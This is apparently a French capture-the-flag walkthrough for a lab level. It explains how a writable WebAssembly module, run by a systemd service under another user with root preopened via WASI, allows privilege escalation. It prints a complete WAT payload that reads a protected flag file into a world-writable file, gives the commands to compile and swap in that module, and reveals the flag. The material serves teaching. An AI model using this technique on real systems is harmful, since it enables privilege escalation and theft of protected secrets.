# Level05 — Exploiter un module WebAssembly modifiable

## Objectif

Nous sommes connectés à la machine Linux avec l’utilisateur `level05`. Notre objectif est de récupérer le flag (le mot de passe permettant de passer au niveau suivant), situé dans `/home/flag05/.flag`.

Le problème est que `level05` n’a pas le droit de lire ce fichier, contrairement à `flag05`. Nous devons donc trouver un moyen de faire lire le fichier par un programme qui possède les droits nécessaires.

Dans ce niveau, la faille vient d’un module WebAssembly que nous pouvons modifier, mais qui est exécuté par un autre utilisateur.

Le niveau peut se résumer ainsi :

```text
level05 modifie un module WASM
          │
          ▼
le service l’exécute comme flag05
          │
          ▼
WASI lui donne accès à /
          │
          ▼
le module lit le flag et l’écrit dans un fichier lisible
```

## 1. Identifier son environnement

```bash
whoami
id
ls -la
```

Ces commandes permettent de savoir avec quel utilisateur nous sommes connectés et quels fichiers nous avons à notre disposition.

- `whoami` affiche le nom de l’utilisateur connecté.
- `id` affiche son identité et les groupes auxquels il appartient. Sous Linux, un groupe permet de partager des droits entre plusieurs utilisateurs.
- `ls -la` affiche les fichiers du dossier courant, y compris les fichiers cachés, ainsi que leurs permissions.

La lecture du README n’étant pas possible ici, on part du nom du compte `level05` pour poursuivre la recherche.

## 2. Trouver les fichiers du niveau

Nous cherchons maintenant des fichiers en rapport avec notre niveau. Ils peuvent nous donner un indice sur la méthode à utiliser :

```bash
find / -iname '*level05*' 2>/dev/null
```

`find /` recherche à partir de la racine du système, `-iname '*level05*'` recherche les noms contenant `level05` et `2>/dev/null` masque les messages d’erreur, notamment ceux liés aux permissions.

Une piste à vérifier parmi les résultats est le dossier `/opt/snowcrash/level05`. Examiner son contenu :

```bash
ls -la /opt/snowcrash/level05
```

Si la liste contient `metaverse.wasm`, identifier sa nature :

```bash
file /opt/snowcrash/level05/metaverse.wasm
```

La commande `file` permet de connaître le type d’un fichier, indépendamment de son nom.

Les notes de résolution présentent ce fichier comme un module WebAssembly. Pour faire simple, un fichier `.wasm` contient un programme qu’un logiciel compatible peut exécuter. Comme un programme Python peut être exécuté par Python, un module WebAssembly peut être exécuté par Wasmtime. La sortie exacte de `find`, de `ls` et de `file` reste à confirmer sur la VM.

## 3. Vérifier que le module est modifiable

```bash
id
ls -l /opt/snowcrash/level05/metaverse.wasm
```

Ces deux commandes doivent être lues ensemble :

- `id` liste les groupes de `level05` ;
- `ls -l` donne le propriétaire, le groupe et les droits du module.

Les permissions Linux indiquent qui peut lire (`r`), modifier (`w`) ou exécuter (`x`) un fichier. Ici, c’est surtout le droit `w` qui nous intéresse : il permet de modifier le contenu du module.

Les notes de résolution indiquent que `level05` appartient au groupe `metaverse` et que ce groupe peut modifier `metaverse.wasm`. Les sorties exactes de `id` et de `ls -l` restent à relever sur la VM pour vérifier ces droits.

À ce stade, nous savons seulement que `level05` contrôle le code du module. Cela ne suffit pas encore à lire `/home/flag05/.flag` : il faut savoir **qui exécute ce module** et **quels fichiers il peut atteindre**.

## 4. Trouver le service qui exécute le module

Nous savons que le module est modifiable. Il faut maintenant comprendre comment il est utilisé.

Un service est un programme, ou une tâche, géré par le système. Il peut être lancé automatiquement, sans que nous ayons à le démarrer nous-mêmes.

Le nom `metaverse.wasm` donne le mot-clé de recherche du service :

```bash
systemctl list-unit-files --all | grep -i metaverse
```

`systemctl list-unit-files --all` liste les fichiers de configuration des unités systemd ; `grep -i metaverse` ne conserve que les lignes contenant `metaverse`, sans distinguer les majuscules et les minuscules.

Le service identifié est `metaverse.service`. Lire sa définition :

```bash
systemctl cat metaverse.service
```

Dans cette sortie, chercher les informations suivantes :

- `User=` : quelle identité exécute le service ? Les notes indiquent `flag05`.
- `ExecStart=` : quelle commande est lancée ? Examiner aussi tout script qu’elle pourrait appeler avant de conclure quel module et quelles options sont utilisés.

Les notes indiquent que Wasmtime exécute `metaverse.wasm` avec la racine `/` préouverte. Si la commande effective contient `--dir=/`, cette option rend la racine accessible au module via WASI, sous réserve des permissions de l’utilisateur du service. La sortie exacte du service et, s’il y en a un, le contenu du script appelé restent à relever sur la VM.

Si le service est exécuté par un timer, le repérer pour savoir quand le module sera relancé. Un timer fonctionne comme une alarme : il demande au système de lancer une tâche à un moment prévu :

```bash
systemctl list-timers --all | grep -i metaverse
```

La chaîne suivante résume les observations rapportées ; il reste à les vérifier à l’aide des commandes ci-dessus :

```text
level05 peut remplacer metaverse.wasm
                 │
                 ▼
metaverse.service le lance sous flag05
                 │
                 ▼
Wasmtime préouvre /
                 │
                 ▼
le module peut demander l’ouverture de home/flag05/.flag
```

C’est le principe de la faille : nous pouvons modifier les instructions d’un programme qui sera exécuté avec les droits de `flag05`.

Imaginez que nous n’avons pas la clé d’un coffre, mais que nous pouvons modifier la liste de tâches d’une personne qui possède cette clé. Cette personne peut alors ouvrir le coffre à notre place. C’est ce que l’on cherche à faire ici. On appelle cela une **élévation de privilèges**.

## 5. Les termes utiles : WASM, WAT et WASI

| Terme | À retenir pour ce niveau |
| --- | --- |
| WASM | Le format binaire exécuté par le service : `metaverse.wasm`. |
| WAT | La version textuelle et lisible d’un module WebAssembly. C’est le format dans lequel nous écrivons le payload. |
| `wat2wasm` | L’outil qui convertit le fichier WAT en fichier WASM. |
| WASI | L’interface par laquelle un module WASM peut demander des opérations telles que l’ouverture ou la lecture d’un fichier. |
| Wasmtime | Le programme qui exécute le module et applique les autorisations WASI définies par le service. |

Un module WASM n’a pas accès aux fichiers par défaut. WASI lui permet de demander certaines opérations au système, mais seulement dans les limites autorisées par Wasmtime et les permissions Linux.

D’après les notes, Wasmtime lui ouvre ici l’accès à `/` (la racine du système de fichiers) : il faut confirmer l’option exacte dans la commande effective. Cela ne donne pas tous les droits sur la machine : le module reste limité aux permissions de `flag05`.

Nous avons donc trois éléments à réunir : un module modifiable par `level05`, un service qui l’exécute sous `flag05`, et un accès WASI au chemin du flag.

## 6. Comprendre le but du payload avant son code

Un **payload** est le programme que nous choisissons de faire exécuter pour obtenir le résultat recherché. Ici, `level05` ne peut pas lire directement le flag. La solution consiste à remplacer le module utilisé par le service par notre propre module : lors du prochain lancement, ses instructions seront exécutées avec les droits du service.

Le fichier [payload.wat](payload.wat) est la version lisible de ce programme. Son but tient en quatre actions :

```text
1. ouvrir home/flag05/.flag
2. lire le flag dans la mémoire du module
3. ouvrir opt/snowcrash/level05/x
4. recopier le flag dans x
```

Les chemins sont relatifs à `/`, le répertoire préouvert par Wasmtime. C’est pourquoi ils ne commencent pas par une barre oblique dans le WAT :

```text
home/flag05/.flag          → /home/flag05/.flag
opt/snowcrash/level05/x    → /opt/snowcrash/level05/x
```

La longueur du payload ne vient pas de ces quatre idées simples. Elle vient du fait que WASI demande au programme de préciser où sont rangés les noms des fichiers, où conserver leur contenu et combien d’octets lire ou écrire. Toutes ces informations sont stockées dans la mémoire du module.

## 7. Lire le payload par étapes

Le payload utilise principalement trois fonctions :

| Fonction | Rôle |
| --- | --- |
| `path_open` | Ouvrir un fichier. |
| `fd_read` | Lire son contenu. |
| `fd_write` | Écrire un contenu dans un fichier. |

On peut imaginer la mémoire du programme comme des cases numérotées. Le programme range dans ces cases les chemins des fichiers, les informations nécessaires à la lecture et le contenu lu. Un tampon est simplement une zone de mémoire utilisée pour conserver temporairement des données.

Le détail des instructions qui suit est utile pour comprendre le code, mais il n’est pas nécessaire de retenir toutes les adresses mémoire pour expliquer la faille.

Le code ci-dessous reprend intégralement [payload.wat](payload.wat). Les explications après `;;` sont des commentaires : elles ne changent pas le comportement du programme.

Pour le lire, il faut connaître trois choses :

- WebAssembly utilise une **pile de valeurs** : `i32.const 64` place le nombre `64` sur la pile ; une instruction ou une fonction le récupère ensuite. `i32` et `i64` désignent des entiers de 32 et 64 bits.
- Un **descripteur** est un numéro que le programme utilise pour désigner un fichier ouvert. Une **adresse** est un emplacement dans la mémoire du module : ce sont deux choses différentes, même si elles sont représentées par des nombres.
- `i32.store` prend une adresse puis une valeur sur la pile et écrit la valeur à cette adresse ; `i32.load` lit la valeur enregistrée à l’adresse placée sur la pile.

```wat
(module  ;; Début du module WebAssembly.

  ;; Demander à WASI la fonction qui ouvre un fichier.
  (import "wasi_snapshot_preview1" "path_open"
    ;; Neuf arguments : emplacement du chemin, droits demandés, etc.
    ;; Le résultat i32 est un code d’erreur : 0 signifie succès.
    (func $path_open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))

  ;; Demander la fonction qui lit un fichier dans la mémoire du module.
  (import "wasi_snapshot_preview1" "fd_read"
    (func $fd_read (param i32 i32 i32 i32) (result i32)))

  ;; Demander la fonction qui écrit la mémoire du module dans un fichier.
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1)  ;; Réserver et exposer une page de 65 536 octets.
  (data (i32.const 0) "home/flag05/.flag")  ;; Placer le chemin source à l’adresse 0.
  (data (i32.const 32) "opt/snowcrash/level05/x")  ;; Chemin de sortie à l’adresse 32.

  (func (export "_start")  ;; Point d’entrée : le runtime commence ici.

    ;; 1. Ouvrir le flag en lecture avec path_open.
    ;; Les neuf valeurs sont placées sur la pile dans l’ordre des arguments.
    i32.const 3   ;; Descripteur supposé du répertoire préouvert : /.
    i32.const 0   ;; Options de résolution du chemin : aucune.
    i32.const 0   ;; Adresse du chemin source dans la mémoire.
    i32.const 17  ;; Longueur du chemin source en octets.
    i32.const 0   ;; Options d’ouverture : ne pas créer ni tronquer.
    i64.const 2   ;; Droit WASI demandé : lecture du fichier.
    i64.const 0   ;; Droits héritables demandés : aucun.
    i32.const 0   ;; Options du descripteur : aucune.
    i32.const 80  ;; Adresse où WASI enregistrera le descripteur obtenu.
    call $path_open  ;; Appeler WASI avec ces neuf arguments.
    drop             ;; Retirer le code d’erreur sans le vérifier.

    ;; 2. Préparer l’iovec : une description du tampon de lecture.
    i32.const 64   ;; Adresse où enregistrer le début du tampon.
    i32.const 128  ;; Le tampon lui-même commence à l’adresse 128.
    i32.store      ;; Écrire 128 à l’adresse 64.

    i32.const 68  ;; Adresse où enregistrer la taille du tampon.
    i32.const 64  ;; Le tampon peut recevoir au maximum 64 octets.
    i32.store     ;; Écrire la taille 64 à l’adresse 68.

    i32.const 72  ;; Adresse réservée au nombre d’octets lus.
    i32.const 0   ;; Valeur initiale : zéro.
    i32.store     ;; Écrire 0 à l’adresse 72.

    ;; 3. Lire le flag dans le tampon.
    i32.const 80  ;; Adresse qui contient le descripteur du fichier source.
    i32.load      ;; Charger ce descripteur pour le passer à fd_read.
    i32.const 64  ;; Adresse de l’iovec : il décrit le tampon.
    i32.const 1   ;; Nombre d’iovecs fournis : un seul.
    i32.const 72  ;; Adresse où WASI écrira le nombre d’octets lus.
    call $fd_read ;; Lire depuis le fichier source vers le tampon.
    drop          ;; Retirer le code d’erreur sans le vérifier.

    ;; 4. Ouvrir le fichier de sortie avec path_open.
    i32.const 3   ;; Descripteur supposé du répertoire préouvert : /.
    i32.const 0   ;; Options de résolution du chemin : aucune.
    i32.const 32  ;; Adresse du chemin de sortie dans la mémoire.
    i32.const 23  ;; Longueur du chemin de sortie en octets.
    i32.const 9   ;; Options WASI : créer si absent et tronquer si présent.
    i64.const 64  ;; Droit WASI demandé : écriture dans le fichier.
    i64.const 0   ;; Droits héritables demandés : aucun.
    i32.const 0   ;; Options du descripteur : aucune.
    i32.const 84  ;; Adresse où WASI enregistrera le descripteur de sortie.
    call $path_open  ;; Ouvrir le fichier de sortie.
    drop             ;; Retirer le code d’erreur sans le vérifier.

    ;; 5. Adapter la taille à la quantité réellement lue.
    i32.const 68  ;; Adresse où se trouve la taille de l’iovec.
    i32.const 72  ;; Adresse qui contient le nombre d’octets lus.
    i32.load      ;; Charger ce nombre.
    i32.store     ;; Le copier à l’adresse 68 à la place de 64.

    ;; 6. Écrire le contenu du tampon dans le fichier de sortie.
    i32.const 84   ;; Adresse qui contient le descripteur de sortie.
    i32.load       ;; Charger ce descripteur pour le passer à fd_write.
    i32.const 64   ;; Adresse de l’iovec : tampon et nouvelle taille.
    i32.const 1    ;; Nombre d’iovecs fournis : un seul.
    i32.const 76   ;; Adresse où WASI écrira le nombre d’octets écrits.
    call $fd_write ;; Écrire le contenu du tampon dans le fichier de sortie.
    drop           ;; Retirer le code d’erreur sans le vérifier.
  )  ;; Fin de la fonction _start.
)    ;; Fin du module.
```

Après une lecture réussie, le flag se trouve dans la mémoire à partir de l’adresse `128`. Sa longueur est enregistrée à l’adresse `72` puis copiée à l’adresse `68`, pour demander à `fd_write` de n’écrire que les octets effectivement lus.

Ce payload suppose que le descripteur `3` correspond à la racine préouverte. Il lit au maximum 64 octets, ignore les codes d’erreur et ne vérifie pas si l’écriture a été complète. La configuration du service reste à vérifier sur la VM.

## 8. Compiler et installer le module

Dans la session existante sous `level05`, créer `/tmp/payload.wat` et y coller le contenu exact de [payload.wat](payload.wat).

```bash
vi /tmp/payload.wat
```

Nous avons besoin d’un fichier de sortie dans lequel le service pourra écrire et que `level05` pourra ensuite lire. Le créer avant le passage du service permet de préparer ses permissions :

```bash
touch /opt/snowcrash/level05/x
chmod 666 /opt/snowcrash/level05/x
```

`touch` crée le fichier `x` s’il n’existe pas. `chmod 666` donne les droits de lecture et d’écriture au propriétaire, au groupe et aux autres utilisateurs. Ces droits sont volontairement larges dans le cadre de ce niveau de laboratoire.

Compiler ensuite le WAT en WASM :

```bash
wat2wasm /tmp/payload.wat -o /tmp/payload.wasm
```

Le fichier WAT est lisible par un humain. `wat2wasm` le convertit au format binaire WASM que Wasmtime peut exécuter.

Puis remplacer le module traité par le service :

```bash
cat /tmp/payload.wasm > /opt/snowcrash/level05/metaverse.wasm
```

`cat` ne lance pas le programme : il remplace seulement le contenu du module que le timer exécutera plus tard.

## 9. Attendre le service puis lire le résultat

Nous n’avons pas besoin de lancer nous-mêmes le programme avec les droits de `flag05` : c’est le service qui s’en charge. Après le prochain passage du timer, lire le fichier de sortie :

```bash
cat /opt/snowcrash/level05/x
```

Le secret récupéré est :

```text
viuaaale9huek52boumoomioc
```